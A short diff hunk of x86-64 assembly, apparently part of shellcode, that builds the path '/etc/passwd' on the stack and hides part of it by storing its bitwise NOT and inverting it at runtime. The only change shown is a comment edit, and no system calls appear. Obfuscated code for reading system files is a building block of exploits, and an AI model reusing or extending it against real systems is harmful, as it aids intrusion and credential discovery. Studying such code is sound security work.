@@ -10,7 +10,7 @@ global _start
 
 _start:
   xor r9 , r9
-  push dword 0x64777373            ; "sswd"
+  push dword 0x64777373            ; "sswd" , dword null extended
   mov rdi , 0x9e8fd0d09c8b9ad0     ; "/etc/pa" , ("noted" part)
   not rdi
   push rdi
